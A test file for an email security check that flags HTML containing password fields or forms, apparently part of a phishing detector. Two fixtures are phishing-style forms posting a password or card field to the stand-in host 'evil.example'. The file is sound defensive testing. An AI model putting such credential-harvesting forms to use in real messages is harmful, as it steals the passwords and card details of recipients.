import { describe, expect, it } from 'vitest';
import { AuthFormInHtmlSignal } from '../../../../../src/security/signals/content/AuthFormInHtmlSignal.js';
import { ingestedEmail, signalContext } from '../fixtures.js';

const signal = new AuthFormInHtmlSignal();
const evaluate = (html) => signal.evaluate(ingestedEmail({ html }), signalContext());

describe('AuthFormInHtmlSignal (S20)', () => {
  it('fires for a password field, even outside a form', () => {
    expect(evaluate('<div><input type="PASSWORD" name="p"></div>')).toEqual({
      id: 'S20',
      name: 'AUTH_FORM_IN_HTML',
      severity: 'high',
      reason: 'The email contains a password field.',
    });
  });

  it('reports the password field when it sits inside a form', () => {
    expect(
      evaluate('<form action="https://evil.example"><input name="u"><input type="password"></form>')
        ?.reason,
    ).toBe('The email contains a password field.');
  });

  it('fires for any form', () => {
    expect(
      evaluate('<form action="https://evil.example"><input name="card"></form>')?.reason,
    ).toMatch(/a form/);
  });

  it('does not fire for ordinary HTML, text that mentions forms, or no HTML', () => {
    expect(
      evaluate('<p>Fill in the &lt;form&gt; on our website. Password reset is in settings.</p>'),
    ).toBeNull();
    expect(evaluate('<!-- <form> --><input type="text">')).toBeNull();
    expect(evaluate('')).toBeNull();
  });
});
